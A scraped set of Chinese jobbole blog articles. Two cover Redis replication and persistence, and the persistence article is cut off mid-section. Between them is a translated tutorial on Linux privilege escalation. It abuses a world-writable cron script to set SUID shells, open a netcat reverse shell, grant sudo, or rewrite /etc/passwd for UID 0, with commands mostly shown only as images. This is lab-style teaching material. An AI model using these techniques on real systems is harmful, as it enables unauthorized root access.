ACK来补充丢失的数据即可。</p>\n<p>第二种情况：网络问题时间很长，主从节点判断超时（触发了repl-timeout），且丢失的数据过多，超过了复制积压缓冲区所能存储的范围；此时主从节点无法进行部分复制，只能进行全量复制。为了尽可能避免这种情况的发生，应该根据实际情况适当调整复制积压缓冲区的大小；此外及时发现并修复网络中断，也可以减少全量复制。</p>\n<p>第三种情况：介于前述两种情况之间，主从节点判断超时，且丢失的数据仍然都在复制积压缓冲区中；此时主从节点可以进行部分复制。</p>\n<h2>5. 复制相关的配置</h2>\n<p>这一节总结一下与复制有关的配置，说明这些配置的作用、起作用的阶段，以及配置方法等；通过了解这些配置，一方面加深对Redis复制的了解，另一方面掌握这些配置的方法，可以优化Redis的使用，少走坑。</p>\n<p>配置大致可以分为主节点相关配置、从节点相关配置以及与主从节点都有关的配置，下面分别说明。</p>\n<h3>（1）与主从节点都有关的配置</h3>\n<p>首先介绍最特殊的配置，它决定了该节点是主节点还是从节点：</p>\n<p>1)   slaveof &lt;masterip&gt; &lt;masterport&gt;：Redis启动时起作用；作用是建立复制关系，开启了该配置的Redis服务器在启动后成为从节点。该注释默认注释掉，即Redis服务器默认都是主节点。</p>\n<p>2)   repl-timeout 60：与各个阶段主从节点连接超时判断有关，见前面的介绍。</p>\n<h3>（2）主节点相关配置</h3>\n<p>1)   repl-diskless-sync no：作用于全量复制阶段，控制主节点是否使用diskless复制（无盘复制）。所谓diskless复制，是指在全量复制时，主节点不再先把数据写入RDB文件，而是直接写入slave的socket中，整个过程中不涉及硬盘；diskless复制在磁盘IO很慢而网速很快时更有优势。需要注意的是，截至Redis3.0，diskless复制处于实验阶段，默认是关闭的。</p>\n<p>2)   repl-diskless-sync-delay 5：该配置作用于全量复制阶段，当主节点使用diskless复制时，该配置决定主节点向从节点发送之前停顿的时间，单位是秒；只有当diskless复制打开时有效，默认5s。之所以设置停顿时间，是基于以下两个考虑：(1)向slave的socket的传输一旦开始，新连接的slave只能等待当前数据传输结束，才能开始新的数据传输 (2)多个从节点有较大的概率在短时间内建立主从复制。</p>\n<p>3)   client-output-buffer-limit slave 256MB 64MB 60：与全量复制阶段主节点的缓冲区大小有关，见前面的介绍。</p>\n<p>4)   repl-disable-tcp-nodelay no：与命令传播阶段的延迟有关，见前面的介绍。</p>\n<p>5)   masterauth &lt;master-password&gt;：与连接建立阶段的身份验证有关，见前面的介绍。</p>\n<p>6)   repl-ping-slave-period 10：与命令传播阶段主从节点的超时判断有关，见前面的介绍。</p>\n<p>7)   repl-backlog-size 1mb：复制积压缓冲区的大小，见前面的介绍。</p>\n<p>8)   repl-backlog-ttl 3600：当主节点没有从节点时，复制积压缓冲区保留的时间，这样当断开的从节点重新连进来时，可以进行全量复制；默认3600s。如果设置为0，则永远不会释放复制积压缓冲区。</p>\n<p>9)   min-slaves-to-write 3与min-slaves-max-lag 10：规定了主节点的最小从节点数目，及对应的最大延迟，见前面的介绍。</p>\n<h3>（3）从节点相关配置</h3>\n<p>1)   slave-serve-stale-data yes：与从节点数据陈旧时是否响应客户端命令有关，见前面的介绍。</p>\n<p>2)   slave-read-only yes：从节点是否只读；默认是只读的。由于从节点开启写操作容易导致主从节点的数据不一致，因此该配置尽量不要修改。</p>\n<h2>6. 单机内存大小限制</h2>\n<p>在 <a href=\"http://blog.jobbole.com/114093/\" target=\"_blank\">深入学习Redis（2）：持久化</a> 一文中，讲到了fork操作对Redis单机内存大小的限制。实际上在Redis的使用中，限制单机内存大小的因素非常之多，下面总结一下在主从复制中，单机内存过大可能造成的影响：</p>\n<p>（1）切主：当主节点宕机时，一种常见的容灾策略是将其中一个从节点提升为主节点，并将其他从节点挂载到新的主节点上，此时这些从节点只能进行全量复制；如果Redis单机内存达到10GB，一个从节点的同步时间在几分钟的级别；如果从节点较多，恢复的速度会更慢。如果系统的读负载很高，而这段时间从节点无法提供服务，会对系统造成很大的压力。</p>\n<p>（2）从库扩容：如果访问量突然增大，此时希望增加从节点分担读负载，如果数据量过大，从节点同步太慢，难以及时应对访问量的暴增。</p>\n<p>（3）缓冲区溢出：（1）和（2）都是从节点可以正常同步的情形（虽然慢），但是如果数据量过大，导致全量复制阶段主节点的复制缓冲区溢出，从而导致复制中断，则主从节点的数据同步会全量复制-&gt;复制缓冲区溢出导致复制中断-&gt;重连-&gt;全量复制-&gt;复制缓冲区溢出导致复制中断……的循环。</p>\n<p>（4）超时：如果数据量过大，全量复制阶段主节点fork+保存RDB文件耗时过大，从节点长时间接收不到数据触发超时，主从节点的数据同步同样可能陷入全量复制-&gt;超时导致复制中断-&gt;重连-&gt;全量复制-&gt;超时导致复制中断……的循环。</p>\n<p>此外，主节点单机内存除了绝对量不能太大，其占用主机内存的比例也不应过大：最好只使用50%-65%的内存，留下30%-45%的内存用于执行bgsave命令和创建复制缓冲区等。</p>\n<h2>7. info Replication</h2>\n<p>在Redis客户端通过info Replication可以查看与复制相关的状态，对于了解主从节点的当前状态，以及解决出现的问题都会有帮助。</p>\n<p>主节点：</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/07/8a91b888c025f2ff104cfca78009de3c.png\" alt=\"\"></p>\n<p>从节点：</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/07/9c94677975e945dc3d9caf2dcc75f130.png\" alt=\"\"></p>\n<p>对于从节点，上半部分展示的是其作为从节点的状态，从connectd_slaves开始，展示的是其作为潜在的主节点的状态。</p>\n<p>info Replication中展示的大部分内容在文章中都已经讲述，这里不再详述。</p>\n<h1>七、总结</h1>\n<p>下面回顾一下本文的主要内容：</p>\n<p>1、主从复制的作用：宏观的了解主从复制是为了解决什么样的问题，即数据冗余、故障恢复、读负载均衡等。</p>\n<p>2、主从复制的操作：即slaveof命令。</p>\n<p>3、主从复制的原理：主从复制包括了连接建立阶段、数据同步阶段、命令传播阶段；其中数据同步阶段，有全量复制和部分复制两种数据同步方式；命令传播阶段，主从节点之间有PING和REPLCONF ACK命令互相进行心跳检测。</p>\n<p>4、应用中的问题：包括读写分离的问题（数据不一致问题、数据过期问题、故障切换问题等）、复制超时问题、复制中断问题等，然后总结了主从复制相关的配置，其中repl-timeout、client-output-buffer-limit slave等对解决Redis主从复制中出现的问题可能会有帮助。</p>\n<p>主从复制虽然解决或缓解了数据冗余、故障恢复、读负载均衡等问题，但其缺陷仍很明显：故障恢复无法自动化；写操作无法负载均衡；存储能力受到单机的限制；这些问题的解决，需要哨兵和集群的帮助，我将在后面的文章中介绍，欢迎关注。</p>\n<h1>参考文献</h1>\n<p>《Redis开发与运维》</p>\n<p>《Redis设计与实现》</p>\n<p>《Redis实战》</p>\n<blockquote class=\"wp-embedded-content\" data-secret=\"CFj9egBfO0\"><p><a href=\"http://mdba.cn/2015/03/16/redis%e5%a4%8d%e5%88%b6%e4%b8%ad%e6%96%ad%e9%97%ae%e9%a2%98-%e6%85%a2%e6%9f%a5%e8%af%a2/\">redis主从复制（1）— 慢查询导致复制中断</a></p></blockquote>\n<p><iframe class=\"wp-embedded-content\" sandbox=\"allow-scripts\" security=\"restricted\" style=\"position: absolute; clip: rect(1px, 1px, 1px, 1px);\" src=\"http://mdba.cn/2015/03/16/redis%e5%a4%8d%e5%88%b6%e4%b8%ad%e6%96%ad%e9%97%ae%e9%a2%98-%e6%85%a2%e6%9f%a5%e8%af%a2/embed/#?secret=CFj9egBfO0\" data-secret=\"CFj9egBfO0\" width=\"600\" height=\"338\" title=\"《redis主从复制（1）— 慢查询导致复制中断》—DBA的罗浮宫\" frameborder=\"0\" marginwidth=\"0\" marginheight=\"0\" scrolling=\"no\"></iframe></p>\n<blockquote class=\"wp-embedded-content\" data-secret=\"JuAJkx6Lpr\"><p><a href=\"https://redislabs.com/blog/top-redis-headaches-for-devops-replication-buffer/\">Top Redis Headaches for Devops – Replication Buffer</a></p></blockquote>\n<p><iframe class=\"wp-embedded-content\" sandbox=\"allow-scripts\" security=\"restricted\" style=\"position: absolute; clip: rect(1px, 1px, 1px, 1px);\" src=\"https://redislabs.com/blog/top-redis-headaches-for-devops-replication-buffer/embed/#?secret=JuAJkx6Lpr\" data-secret=\"JuAJkx6Lpr\" width=\"600\" height=\"338\" title=\"“Top Redis Headaches for Devops – Replication Buffer” — Redis Labs\" frameborder=\"0\" marginwidth=\"0\" marginheight=\"0\" scrolling=\"no\"></iframe></p>\n<blockquote class=\"wp-embedded-content\" data-secret=\"KtHjsj0weV\"><p><a href=\"http://mdba.cn/2015/03/17/redis%e4%b8%bb%e4%bb%8e%e5%a4%8d%e5%88%b6%ef%bc%882%ef%bc%89-replication-buffer%e4%b8%8ereplication-backlog/\">redis主从复制（2）— replication buffer与replication backlog</a></p></blockquote>\n<p><iframe class=\"wp-embedded-content\" sandbox=\"allow-scripts\" security=\"restricted\" style=\"position: absolute; clip: rect(1px, 1px, 1px, 1px);\" src=\"http://mdba.cn/2015/03/17/redis%e4%b8%bb%e4%bb%8e%e5%a4%8d%e5%88%b6%ef%bc%882%ef%bc%89-replication-buffer%e4%b8%8ereplication-backlog/embed/#?secret=KtHjsj0weV\" data-secret=\"KtHjsj0weV\" width=\"600\" height=\"338\" title=\"《redis主从复制（2）— replication buffer与replication backlog》—DBA的罗浮宫\" frameborder=\"0\" marginwidth=\"0\" marginheight=\"0\" scrolling=\"no\"></iframe></p>\n<p><a href=\"https://github.com/antirez/redis/issues/918\">https://github.com/antirez/redis/issues/918</a></p>\n<p>https://blog.csdn.net/qbw2010/article/details/50496982</p>\n<p>https://mp.weixin.qq.com/s?__biz=MzIxMzEzMjM5NQ==&amp;mid=2651029484&amp;idx=1&amp;sn=5882f4c7c390a0a0e4f6dfd872e203b5&amp;chksm=8c4caae8bb3b23fe77909e307d45a071186f55069e5207602c61383eab573885615c1d835904&amp;mpshare=1&amp;scene=1&amp;srcid=0327SokqtxEY3WojWNDMHLYl#rd</p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"114194\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"114194votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"114194\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i>  收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i>  评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "front_image_path": "full/c766feed221138f7946130756cddfc7e86e388b4.jpg"},{"url_object_id": "cbb3b429719bda3e099c2522f8c301a8", "title": ["通过可写文件获取 Linux root 权限的 5 种方法"], "url": "http://blog.jobbole.com/114159/", "create_date": "2018/06/26", "front_image_url": ["http://jbcdn2.b0.upaiyun.com/2018/01/1b8322e1daff605d71fc81e724421f17.jpg"], "praise_nums": "2", "comment_nums": 1, "fav_nums": 1, "tags": "IT技术, Linux", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a ref=\"nofollow\" target=\"_blank\" href=\"http://www.hackingarticles.in/multiple-ways-to-get-root-through-writable-file/\">Raj Chandel</a>   译文出处：<a target=\"_blank\" href=\"http://www.4hou.com/technology/12134.html\">ang010ela</a>   </div><p>Linux系统中，全部都是以文件形式存在的，包括目录、设备都是有权限的，共有读、写、可执行三种。管理员为文件设置好权限后，应该要考虑哪些Linux用户会被允许和限制上述的三个权限。</p>\n<p>通过可写脚本进行root提取的5种方法：</p>\n<p><strong>· </strong>复制 /bin/sh 到 /tmp</p>\n<p><strong>· </strong>设定 /bin/dash的SUID位</p>\n<p><strong>· </strong>通过sudoer给登录用户完全的权限</p>\n<p><strong>· </strong>设定/bin/cp的SUID位</p>\n<p><strong>· </strong>逆向连接到恶意代码</p>\n<p>开启攻击机器，黑掉目标系统，然后进行权限提升。假设成功地通过ssh登录到受害者的机器，并可以访问非root的用户终端。然后使用下面的命令，下面会举例所有有写权限的二进制文件。</p>\n<p><img class=\"aligncenter\" title=\"1529412592363232.png\" src=\"http://jbcdn2.b0.upaiyun.com/2018/06/1e7977c9bc9757738b3a866488ea5d62.png\" alt=\"image.png\"></p>\n<p>可以看到一个/lib/log中保存的python文件，在路径中我们看到了sanitizer.py文件的权限为777。</p>\n<p><img class=\"aligncenter\" title=\"1529412639504718.png\" src=\"http://jbcdn2.b0.upaiyun.com/2018/06/964f0d836515a1f465fa5dc271d2f0a1.png\" alt=\"image.png\"></p>\n<p>Admin要将下面的脚本加入，来清理/tmp中的垃圾文件。如果攻击者能够识别受害者机器中的这类情形，就可以通过下面的方式来提升root权限来破坏系统。</p>\n<p><img class=\"aligncenter\" title=\"1529412656940436.png\" src=\"http://jbcdn2.b0.upaiyun.com/2018/06/39214efb2063fa48217699186079c317.png\" alt=\"image.png\"></p>\n<p><strong>第一种方法</strong></p>\n<p>有许多的方法可以获取root权限，本方法中，我们将/bin/sh复制到/tmp文件夹中，然后设置/tmp/sh的SUID。这种方式非常简单，首先，通过nano编辑器打开文件，然后用rm -r /tmp/* 替换下面的命令：</p>\n<p><img class=\"aligncenter\" title=\"1529412681445056.png\" src=\"http://jbcdn2.b0.upaiyun.com/2018/06/dcf60a5fe3c007b80794b0c24ce5f6af.png\" alt=\"image.png\"></p>\n<p>在/tmp目录创建一个有SUID权限的sh文件后，允许sh文件时会有root访问权限。</p>\n<p><img class=\"aligncenter\" title=\"1529412695478987.png\" src=\"http://jbcdn2.b0.upaiyun.com/2018/06/0d5093e8d17512913d21f495b117af49.png\" alt=\"image.png\"></p>\n<p>可以通过下面的图片进行确认：</p>\n<p><img class=\"aligncenter\" title=\"1529412712243123.png\" src=\"http://jbcdn2.b0.upaiyun.com/2018/06/205448a574dc96c889344dc9dafdd8cb.png\" alt=\"image.png\"></p>\n<p><strong>第二种方法</strong></p>\n<p>同样地，可以用rm -r /tmp/* 替换下面行的内容</p>\n<p><img class=\"aligncenter\" title=\"1529412732150633.png\" src=\"http://jbcdn2.b0.upaiyun.com/2018/06/bed4185b31699ce45bfaf3c5619ec88e.png\" alt=\"image.png\"></p>\n<p>在设置了/bin/dash的SUID权限后，运行后就可以获取root权限</p>\n<p><img class=\"aligncenter\" title=\"1529412745399156.png\" src=\"http://jbcdn2.b0.upaiyun.com/2018/06/34b3b42d097322d3fe33db6881f6dc11.png\" alt=\"image.png\"></p>\n<p>可以通过下面的图进行确认：</p>\n<p><img class=\"aligncenter\" title=\"1529412761544191.png\" src=\"http://jbcdn2.b0.upaiyun.com/2018/06/a44576fbd2965f44814965d14a2c9baf.png\" alt=\"image.png\"></p>\n<p><strong>第三种方法</strong></p>\n<p><img class=\"aligncenter\" title=\"1529412774505929.png\" src=\"http://jbcdn2.b0.upaiyun.com/2018/06/1472d7a6a5b70fd0a5caa935b6495cd7.png\" alt=\"image.png\"></p>\n<p>通过netcat逆向了连接后，就可以获取root权限。</p>\n<p>可以通过下面的图进行确认：</p>\n<p><img class=\"aligncenter\" title=\"1529412789517187.png\" src=\"http://jbcdn2.b0.upaiyun.com/2018/06/297bcaf946124ac842925a0ac6a82d09.png\" alt=\"image.png\"></p>\n<p><strong>第4种方法</strong></p>\n<p>另一个方法是给登录的用户sudo权限。下面的图中可以看出当前用户wernerbrandes不能允许sudo命令。</p>\n<p><img class=\"aligncenter\" title=\"1529412804140224.png\" src=\"http://jbcdn2.b0.upaiyun.com/2018/06/253ff8bf45823dc36d7dfd382bdd1ad5.png\" alt=\"image.png\"></p>\n<p>同样地，可以在下面替换rm -r /tmp/*</p>\n<p><img class=\"aligncenter\" title=\"1529412823891649.png\" src=\"http://jbcdn2.b0.upaiyun.com/2018/06/2526a8e7e2c6b56429b1401b51f05ecd.png\" alt=\"image.png\"></p>\n<p>当输入“sudo -l”命令时会发现，这是sudo用户的一个成员。可以利用sudo bash来获取root权限。</p>\n<p><img class=\"aligncenter\" title=\"1529412835748075.png\" src=\"http://jbcdn2.b0.upaiyun.com/2018/06/c7880f8f99521d379c511cead4b8d7a0.png\" alt=\"image.png\"></p>\n<p><strong>第5种方法</strong></p>\n<p>因为在linux类系统中，passwd文件起着很重要的作用。所以，如果攻击者有机会修改passwd文件，那么这将会成为一种动态的权限提升的方式。<br>\n同样地，可以利用cat命令查看etc/passwd文件的内容。<br>\nUID:1000 &amp; GID:1000 就是admin组队成员。下面编辑一下nemo记录来使其成为root组成员，选择etc/passwd的整个内容并复制粘贴到空text文件中。</p>\n<p><img class=\"aligncenter\" title=\"1529412862186777.png\" src=\"http://jbcdn2.b0.upaiyun.com/2018/06/c0fac052f49554a228dd7921afb830fb.png\" alt=\"image.png\"></p>\n<p>然后，在一个新的终端上生成一个含salt的密码，然后复制。</p>\n<p><img class=\"aligncenter\" title=\"1529412882678813.png\" src=\"http://jbcdn2.b0.upaiyun.com/2018/06/1aa9b7caf0e0a26b773e5ddc1dd36a89.png\" alt=\"image.png\"></p>\n<p>然后粘贴之前复制的含salt的密码在用户nemo的记录词条的X位置处，并修改UID&amp;GID为0:0。完成上面的步骤后，我们就可以将其保存为passwd。</p>\n<p><img class=\"aligncenter\" title=\"1529412899438763.png\" src=\"http://jbcdn2.b0.upaiyun.com/2018/06/39851bc754c3333d3391754370ca9198.png\" alt=\"image.png\"></p>\n<p>利用可写的脚本替换 “rm -r /tmp/*”</p>\n<p><img class=\"aligncenter\" title=\"1529412924674942.png\" src=\"http://jbcdn2.b0.upaiyun.com/2018/06/1ac119b231c99b98f495d4b68d07401c.png\" alt=\"image.png\"></p>\n<p>设置/bin/cp的SUID来复制文件。</p>\n<p><img class=\"aligncenter\" title=\"1529412935719677.png\" src=\"http://jbcdn2.b0.upaiyun.com/2018/06/7f7a038894570cdee6341602844bb360.png\" alt=\"image.png\"></p>\n<p>将修改后的passwd文件下载受害者机器的/tmp文件夹中。用下面的命令检查/bin/cp的SUID位是否开启。</p>\n<p><img class=\"aligncenter\" title=\"1529412953595227.png\" src=\"http://jbcdn2.b0.upaiyun.com/2018/06/a8322a3d2072ceb1a4b10099f03dec36.png\" alt=\"image.png\"></p>\n<p>下面确认是否改变了passwd文件的内容：</p>\n<p><img class=\"aligncenter\" title=\"1529412972236235.png\" src=\"http://jbcdn2.b0.upaiyun.com/2018/06/d2e4f2d6ee16c639cfcc3fe0516161f5.png\" alt=\"image.png\"></p>\n<p>可以看出passwd文件中的变化：</p>\n<p><img class=\"aligncenter\" title=\"1529412987405083.png\" src=\"http://jbcdn2.b0.upaiyun.com/2018/06/0dae580655080853330e9dc34bf88e6e.png\" alt=\"image.png\"></p>\n<p>可以执行下面的命令来获取root权限：</p>\n<p><img class=\"aligncenter\" title=\"1529413000676512.png\" src=\"http://jbcdn2.b0.upaiyun.com/2018/06/19e39ae621feb388e358cd0783dd0cff.png\" alt=\"image.png\"></p>\n<p>本文证明了攻击者如何通过可写文件进行linux系统权限提升。</p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"114159\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"114159votetotal\">2</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"114159\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 1 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i> 1 评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "front_image_path": "full/14452eea6b79bce0219227f298ad827f2ba7112d.jpg"},{"url_object_id": "e4cc420154439ecffbc963653c5f7cd8", "title": ["深入学习 Redis（2）：持久化"], "url": "http://blog.jobbole.com/114093/", "create_date": "2018/06/07", "front_image_url": ["http://jbcdn2.b0.upaiyun.com/2016/04/49961db8952e63d98b519b76a2daa5e2.png"], "praise_nums": "1", "comment_nums": 0, "fav_nums": 0, "tags": "IT技术, Redis, 数据库", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a target=\"_blank\" href=\"https://www.cnblogs.com/kismetv/p/9137897.html\">编程迷思</a>   </div><h2>前言</h2>\n<p>在上一篇文章中，介绍了<a href=\"http://blog.jobbole.com/113789/\" target=\"_blank\">Redis的内存模型</a>，从这篇文章开始，将依次介绍Redis高可用相关的知识——持久化、复制(及读写分离)、哨兵、以及集群。</p>\n<p>本文将先说明上述几种技术分别解决了Redis高可用的什么问题；然后详细介绍Redis的持久化技术，主要是RDB和AOF两种持久化方案；在介绍RDB和AOF方案时，不仅介绍其作用及操作方法，同时介绍持久化实现的一些原理细节及需要注意的问题。最后，介绍在实际使用中，持久化方案的选择，以及经常遇到的问题等。</p>\n<h1>一、Redis高可用概述</h1>\n<p>在介绍Redis高可用之前，先说明一下在Redis的语境中高可用的含义。</p>\n<p>我们知道，在web服务器中，高可用是指服务器可以正常访问的时间，衡量的标准是在多长时间内可以提供正常服务（99.9%、99.99%、99.999% 等等）。但是在Redis语境中，高可用的含义似乎要宽泛一些，除了保证提供正常服务(如主从分离、快速容灾技术)，还需要考虑数据容量的扩展、数据安全不会丢失等。</p>\n<p>在Redis中，实现高可用的技术主要包括持久化、复制、哨兵和集群，下面分别说明它们的作用，以及解决了什么样的问题。</p>\n<ol>\n<li>持久化：持久化是最简单的高可用方法(有时甚至不被归为高可用的手段)，主要作用是数据备份，即将数据存储在硬盘，保证数据不会因进程退出而丢失。</li>\n<li>复制：复制是高可用Redis的基础，哨兵和集群都是在复制基础上实现高可用的。复制主要实现了数据的多机备份，以及对于读操作的负载均衡和简单的故障恢复。缺陷：故障恢复无法自动化；写操作无法负载均衡；存储能力受到单机的限制。</li>\n<li>哨兵：在复制的基础上，哨兵实现了自动化的故障恢复。缺陷：写操作无法负载均衡；存储能力受到单机的限制。</li>\n<li>集群：通过集群，Redis解决了写操作无法负载均衡，以及存储能力受到单机限制的问题，实现了较为完善的高可用方案。</li>\n</ol>\n<h1>二、Redis 持久化概述</h1>\n<p>持久化的功能：Redis是内存数据库，数据都是存储在内存中，为了避免进程退出导致数据的永久丢失，需要定期将Redis中的数据以某种形式(数据或命令)从内存保存到硬盘；当下次Redis重启时，利用持久化文件实现数据恢复。除此之外，为了进行灾难备份，可以将持久化文件拷贝到一个远程位置。</p>\n<p>Redis持久化分为RDB持久化和AOF持久化<strong>：前者将当前数据保存到硬盘，后者则是将每次执行的写命令保存到硬盘（类似于MySQL的binlog）；</strong>由于AOF持久化的实时性更好，即当进程意外退出时丢失的数据更少，因此AOF是目前主流的持久化方式，不过RDB持久化仍然有其用武之地。</p>\n<p>下面依次介绍RDB持久化和AOF持久化；由于Redis各个版本之间存在差异，如无特殊说明，以Redis3.0为准。</p>\n<h1>三、RDB持久化</h1>\n<p>RDB持久化是将当前进程中的数据生成快照保存到硬盘(因此也称作快照持久化)，保存的文件后缀是rdb；当Redis重新启动时，可以读取快照文件恢复数据。</p>\n<h2>1. 触发条件</h2>\n<p>RDB持久化的触发分为手动触发和自动触发两种。</p>\n<h3>1) 手动触发</h3>\n<p>save命令和bgsave命令都可以生成RDB文件。</p>\n<p>save命令会阻塞Redis服务器进程，直到RDB文件创建完毕为止，在Redis服务器阻塞期间，服务器不能处理任何命令请求。</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/06/662665d4fe41bbae40cff2548bc1c4ee.png\" alt=\"\"></p>\n<p>而bgsave命令会创建一个子进程，由子进程来负责创建RDB文件，父进程(即Redis主进程)则继续处理请求。</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/06/fbe173ede64bc88f834bc25d89f8f44f.png\" alt=\"\"></p>\n<p>此时服务器执行日志如下：</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/06/fbb24a124ecb5ddf9c02d425ddc488d2.png\" alt=\"\"></p>\n<p>bgsave命令执行过程中，只有fork子进程时会阻塞服务器，而对于save命令，整个过程都会阻塞服务器，因此save已基本被废弃，线上环境要杜绝save的使用；后文中也将只介绍bgsave命令。此外，在自动触发RDB持久化时，Redis也会选择bgsave而不是save来进行持久化；下面介绍自动触发RDB持久化的条件。</p>\n<h3>2) 自动触发</h3>\n<p><strong>save m n</strong></p>\n<p>自动触发最常见的情况是在配置文件中通过save m n，指定当m秒内发生n次变化时，会触发bgsave。</p>\n<p>例如，查看redis的默认配置文件(Linux下为redis根目录下的redis.conf)，可以看到如下配置信息：</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/06/940eea59eb4ff44da2ba1a95bf28ab2c.png\" alt=\"\"></p>\n<p>其中save 900 1的含义是：当时间到900秒时，如果redis数据发生了至少1次变化，则执行bgsave；save 300 10和save 60 10000同理。当三个save条件满足任意一个时，都会引起bgsave的调用。</p>\n<p><strong>save m n的实现原理</strong></p>\n<p>Redis的save m n，是通过serverCron函数、dirty计数器、和lastsave时间戳来实现的。</p>\n<p>serverCron是Redis服务器的周期性操作函数，默认每隔100ms执行一次；该函数对服务器的状态进行维护，其中一项工作就是检查 save m n 配置的条件是否满足，如果满足就执行bgsave。</p>\n<p>dirty计数器是Redis服务器维持的一个状态，记录了上一次执行bgsave/save命令后，服务器状态进行了多少次修改(包括增删改)；而当save/bgsave执行完成后，会将dirty重新置为0。</p>\n<p>例如，如果Redis执行了set mykey helloworld，则dirty值会+1；如果执行了sadd myset v1 v2 v3，则dirty值会+3；注意dirty记录的是服务器进行了多少次修改，而不是客户端执行了多少修改数据的命令。</p>\n<p>lastsave时间戳也是Redis服务器维持的一个状态，记录的是上一次成功执行save/bgsave的时间。</p>\n<p>save m n的原理如下：每隔100ms，执行serverCron函数；在serverCron函数中，遍历save m n配置的保存条件，只要有一个条件满足，就进行bgsave。对于每一个save m n条件，只有下面两条同时满足时才算满足：</p>\n<p>（1）当前时间-lastsave &gt; m</p>\n<p>（2）dirty &gt;= n</p>\n<p><strong>save m n 执行日志</strong></p>\n<p>下图是save m n触发bgsave执行时，服务器打印日志的情况：</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/06/969e9ec6f50fedbdd85b68d2becb5b9a.png\" alt=\"\"></p>\n<p><strong>其他自动触发机制</strong></p>\n<p>除了save m n 以外，还有一些其他情况会触发bgsave：</p>\n<ul>\n<li>在主从复制场景下，如果从节点执行全量复制操作，则主节点会执行bgsave命令，并将rdb文件发送给从节点</li>\n<li>执行shutdown命令时，自动执行rdb持久化，如下图所示：</li>\n</ul>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/06/026e36b9dd1e7d05a54e83405e4a8d19.png\" alt=\"\"></p>\n<h2>2. 执行流程</h2>\n<p>前面介绍了触发bgsave的条件，下面将说明bgsave命令的执行流程，如下图所示(图片来源：https://blog.csdn.net/a1007720052/article/details/79126253)：</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/06/d7320b5cc683f2e4eafeff120f5242cc.png\" alt=\"\"></p>\n<p>图片中的5个步骤所进行的操作如下：</p>\n<p>1)  Redis父进程首先判断：当前是否在执行save，或bgsave/bgrewriteaof（后面会详细介绍该命令）的子进程，如果在执行则bgsave命令直接返回。bgsave/bgrewriteaof 的子进程不能同时执行，主要是基于性能方面的考虑：两个并发的子进程同时执行大量的磁盘写操作，可能引起严重的性能问题。</p>\n<p>2)  父进程执行fork操作创建子进程，这个过程中父进程是阻塞的，Redis不能执行来自客户端的任何命令</p>\n<p>3)  父进程fork后，bgsave命令返回”Background saving started”信息并不再阻塞父进程，并可以响应其他命令</p>\n<p>4)  子进程创建RDB文件，根据父进程内存快照生成临时快照文件，完成后对原有文件进行原子替换</p>\n<p>5)  子进程发送信号给父进程表示完成，父进程更新统计信息</p>\n<h2>3. 